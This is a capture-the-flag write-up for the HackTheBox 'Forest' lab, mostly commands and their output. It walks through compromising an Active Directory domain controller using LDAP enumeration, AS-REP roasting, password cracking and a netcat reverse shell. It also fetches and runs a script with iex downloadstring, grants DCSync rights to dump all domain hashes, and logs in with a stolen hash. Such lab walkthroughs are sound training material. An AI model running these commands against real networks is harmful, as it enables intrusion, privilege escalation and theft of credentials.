---
title: Forest HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2019-12-12 14:10:00 +0800
categories: [Blogging, HTB, Writeup]
tags: [htb,pentest,windows,activedirectory,easy,retired]
---

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/forest-description.png?raw=true)

<script id="asciicast-7qNiXMLBlH5xN0amZGTJ8bYWU" src="https://asciinema.org/a/7qNiXMLBlH5xN0amZGTJ8bYWU.js" async></script>

## Sumary 

Forest is easy machine. The goal is pwned a Windows Domain Controller where is installed a Exchange Server too. The DC allow anonymous bind in LDAP. After that you use this information to gain access because there is a user with pre authentication disabled in kerberos. In the initial shell we enumerate and discovery that particular user is member of Account Operator wich is special group  that can be used to add users in Exchange group. After that, you can use this path to grab DCSync privileges and dump the hashes of entire Active Direcory. 

## Skills Necessary  

- Enumeration
- Windows Active Directory Groups and Permissions 

## Skills Learned

- ASRepRoasting
- Blodhound Enumeration
- DCSync 




## Recon 

A simple nmap scan reveals a lot of open ports:

```bash
dumbland () hgfs/hackthebox/forest :: nmap --open -Pn -sVC  10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-20 15:45 EDT
Stats: 0:02:01 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 90.91% done; ETC: 15:47 (0:00:12 remaining)
Nmap scan report for forest.htb.local (10.10.10.161)
Host is up (0.14s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-20 19:53:22Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=4/20%Time=5E9DFBE1%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m51s, deviation: 4h02m30s, median: 7m50s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-04-20T12:55:45-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-04-20T19:55:47
|_  start_date: 2020-04-20T18:27:27

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 288.64 seconds
```

In the **nmap** output we have a lot information. For the moment keep in mind that machine is leaked the dns name-: **htb.local**. So I put in **/etc/hosts** the name of **forest.htb.local**.  

Following the OSCP methodology I create a **TO-DO LIST** to initial foothold:

1. Try anonymous bind in **LDAP** service.
2. Try anonymous connection in **SMB** service.
3. Lookup for valid users in **KERBEROS** service.
4. Try ASREPRoasting with user found in step 1 or 3. 
5. Brute force with valid users found in  step 1 or 3 in **SMB** service.
6. Pray

Lets dive in this **to-do** list.



## Ldap

```bash	
dumbland () hgfs/hackthebox/forest :: ldapsearch -h 10.10.10.161 -p 389 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

The leaked dns name is correct, so far so good until now.  Next step is try to dump the ldap.



```bash	
dumbland () hgfs/hackthebox/forest :: ldapsearch -h 10.10.10.161 -p 389 -x -b "DC=htb,DC=local" | head -n 100
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# htb.local
dn: DC=htb,DC=local
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=htb,DC=local
instanceType: 5
whenCreated: 20190918174549.0Z
whenChanged: 20200420182717.0Z
subRefs: DC=ForestDnsZones,DC=htb,DC=local
subRefs: DC=DomainDnsZones,DC=htb,DC=local
subRefs: CN=Configuration,DC=htb,DC=local
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAOqNrI1l5QUq5WV+CaJoIcQ==
uSNChanged: 266275
name: htb
objectGUID:: Gsfw30mpJkuMe1Lj4stuqw==
replUpToDateVector:: AgAAAAAAAAANAAAAAAAAAIArugegK3xCjpG3jOKvTZsK8AAAAAAAAPxOm
 RMDAAAAabVZH/qLqUezsFIuoNRi7BZQAwAAAAAAAdWqEwMAAAA6o2sjWXlBSrlZX4JomghxBaAAAA
 AAAABfIZkTAwAAAP0hPznuljZMsEO8D3CNdboZEAQAAAAAAIN6rhQDAAAAEDwBQbSMnUWI4nq8BY7
 j1xUwAwAAAAAA1demEwMAAAC1MMZhokGwRbE0QRq1TjFjCNAAAAAAAACfPZkTAwAAAE58Y3hmFuxJ
 q5zNUe5gSIETcAIAAAAAAN1toBMDAAAAMfTGi0VweUOmm5nytI0mcAwQAQAAAAAAhsWZEwMAAAC3A
 v6PCrb7RZmWISKtMYqnBrAAAAAAAADXKZkTAwAAABrEn5A0MsdDnmVMaqgu98YLAAEAAAAAAMqtmR
 MDAAAAUF3volw280y9xuEvN4KR2RegAwAAAAAAaaqrEwMAAAB5TzHrWI2FTZJLavLc7Dl3CeAAAAA
 AAADPRZkTAwAAABLjqfHAurdPrmqHvN46py0HwAAAAAAAAMM3mRMDAAAA
creationTime: 132318808376593626
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 0
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAALB4ltxV1shXFsPNP
```

The same result can be did with **windapsearch.py**: 

```bash
dumbland () hgfs/hackthebox/forest :: ~/pentest/windapsearch/windapsearch.py -d htb --dc-ip 10.10.10.161 --custom objectclass=\* 
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.10.161
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=htb,DC=local
[+] Attempting bind
[+]     ...success! Binded as:
[+]      None
[+] Performing custom lookup with filter: "objectclass=*"
[+]     Found 312 results:

DC=htb,DC=local

CN=Users,DC=htb,DC=local

CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local

CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local

CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local

CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local

CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local

CN=Protected Users,CN=Users,DC=htb,DC=local

CN=Key Admins,CN=Users,DC=htb,DC=local

CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local

CN=DnsAdmins,CN=Users,DC=htb,DC=local

CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local

CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local

CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
```

Redirect this output to a file and after some scripts commands we can achieve a  list of valid ldap  users.  

```bash	
dumbland () hgfs/hackthebox/forest :: cat user-list.txt | head -n 20 
$331000-VK4ADACQNUCA
$D31000-NSEL5BRJ63V7
Administrator
andy
DefaultAccount
Domain Name: HTB
EXCH01$
Exchange Servers
Exchange Trusted Subsystem
FOREST$
Guest
HealthMailbox0659cc1
HealthMailbox670628e
HealthMailbox6ded678
HealthMailbox7108a4e
HealthMailbox83d6781
HealthMailbox968e74d
HealthMailboxb01ac64
HealthMailboxc0a90c9
HealthMailboxc3d7722
....snip...........
john
krbtgt
lucinda
mark
santi
sebastien
Service Accounts
SM_1b41c9286325456bb
SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb
SM_681f53d4942840e18
SM_75a538d3025e4db9a
SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b
svc-alfresco
```

Now its time to get some hashes. This is possibles because are some user with kerberos authentication disabled. See links in reference to get a better explanation.

```bash
dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/GetNPUsers.py  -usersfile user-list.txt  htb.local/ -dc-ip 10.10.10.161 -no-pass
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
----------------------------snip--------------------------------------------
$krb5asrep$23$svc-alfresco@HTB.LOCAL:28e829cbf7061ae679b32d5286b1e46e$15ba62f2dd3c85fda3c76fb3b90574e084d03513400849474baaf815254850bcec2615046b80344e0d8e1a96472d150c67c8aedc33ecec337a5ce7dec6878083afda63be89b86e140a896db771e91d525ba1b690fd9c23f0a5c414c0212dce8416d3f4fa4abbe875ca72ab825eaabfba5b27be23f06360c98cd22f69f6f67d2ad8fdc5ea515014321740785b520767107d7d4db7b4b77893b95ffa0bc027ec11ef016e8656ad3183c036f6c2d4086af358511d8ff220358163be7c9c5dfecfa6205773330b34ca12fa7fbe27b4bb3f1842fbd39296c840736507119881ae08b9faa1c7a35b8e
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
----------------------------snip--------------------------------------------

```



 Put this in a file and fire up **john**:

```bash
dumbland () hgfs/hackthebox/forest :: sudo john hash-svc-alfreco.txt - w=/home/dumb/pentest/SecLists/Passwords/rockyou.txt --fork=4
[sudo] password for dumb:
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Node numbers 1-4 of 4 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB)

```



Check if this password can be used in smb:

```bash
dumbland () hgfs/hackthebox/forest :: hydra -l svc-alfresco -p s3rvice smb://10.10.10.161
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-20 19:35:19
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking smb://10.10.10.161:445/
[445][smb] host: 10.10.10.161   login: svc-alfresco   password: s3rvice
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-20 19:35:20
```



After some enumeration with **smbclient** and **smbmap** we move on to get a initial shell.



## Initial Shell

in the nmap we saw the port 5985 is open. Let see if we can run evil-winrm:

```bash
dumbland () hgfs/hackthebox/forest :: evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
cd Deskto*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
cat *Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
e5e4e47ae7022664cdaxxxxxxxxxxxxx
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```



## Priv Escalation 

In the initial recon we saw the machine is a domain controller of a active directory. The natural choice is **bllodhond**. Upload sharphound.exe, ran and collect the generate files. For his machine is enough, you do not worry about any av evasion technique. 

```bash	
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.ps1
Info: Uploading SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload nc.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir

    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name                                                                                                                                       
----                -------------         ------ ----                                                                                                                                       
-a----        4/20/2020   5:40 PM          59392 nc.exe                                                                                                                                     
-a----        4/20/2020   5:36 PM         886533 SharpHound.ps1                                                                                                                                                        
```

Now we setup a listener in other terminal and ran in the terminal of evil-winrm:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> .\nc.exe 10.10.14.35 4242 -e powershell.exe
```

In the other terminal we get a nc shell. 

```bash
dumbland () hgfs/hackthebox/forest :: nc -nlvp 4242
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4242
Ncat: Listening on 0.0.0.0:4242
Ncat: Connection from 10.10.10.161.
Ncat: Connection from 10.10.10.161:50092.
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\svc-alfresco\Documents> iex (new-object net.webclient).downloadstring('http://10.10.14.35:4242/SharpHound.ps1')
iex (new-object net.webclient).downloadstring('http://10.10.14.35:4242/SharpHound.ps1')
PS C:\Users\svc-alfresco\Documents> Invoke-Bloodhound -CollectionMethod All -LDAPPort 389 -LDAPUser svc-alfresco -LDAPPass s3rvice
Invoke-Bloodhound -CollectionMethod All -LDAPPort 389 -LDAPUser svc-alfresco -LDAPPass s3rvice
```

Collect the file generate by sharphound and import in bloodhound. Lets analyze the informations to see if I  found the path to pwn the active directory:

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/forest-blodhound-path.jpg?raw=true)

We see two important information:

1. svc-alfresco can create domaisn users
2. svc-alfresco has WriterDacl. 

Lest exploit both them:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user dumbx90 dumbwitheffort /add
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" dumbx90 /add
The command completed successfully.
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" dumbx90 /add
The command completed successfully.
```



Now Transfer the **Powerview.ps1** script to target machine:

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user dumbx90 dumbwitheffort /add /domain
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" dumbx90 /add
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" dumbx90 /add
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'dumbwitheffort' -asplain -force
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential("htb\dumbx90", $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectACL -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity dumbx90 -Rights DCSync

```

Now with the create user, lets dump the hashes of domain controller:

```bash
dumbland () hgfs/hackthebox/forest :: /home/dumb/tools/impacket/examples/secretsdump.py htb.local/dumbx90:dumbwitheffort@10.10.10.161
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130
```



## Root shell

With the administrator hash, just  run psexec.py to get a shell:

```bash
dumbland () hgfs/hackthebox/forest :: crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:HTB) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] HTB\Administrator 32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
```

```bash
dumbland () hgfs/hackthebox/forest :: ~/pentest/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161        1 ↵
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file sodACiUM.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service JToR on 10.10.10.161.....
[*] Starting service JToR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\Users\Administrator\Desktop

c:\Users\Administrator\Desktop>whoami
nt authority\system

c:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is E8B0-D68E

 Directory of c:\Users\Administrator\Desktop

09/23/2019  02:15 PM    <DIR>          .
09/23/2019  02:15 PM    <DIR>          ..
09/23/2019  02:15 PM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  31,106,588,672 bytes free

c:\Users\Administrator\Desktop>
```



## Tools used in this post

- https://linux.die.net/man/1/ldapsearch
- https://github.com/BloodHoundAD/BloodHound
- https://github.com/SecureAuthCorp/impacket
- https://github.com/vanhauser-thc/thc-hydra
- https://github.com/Hackplayers/evil-winrm
- https://github.com/PowerShellMafia/PowerSploit (use dev branch)

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors.pdf

- https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

- https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/

- https://www.c0d3xpl0it.com/2019/02/privexchange-one-hop-away-from-domain-admin.html

- https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html

- https://www.tarlogic.com/en/blog/how-to-attack-kerberos/

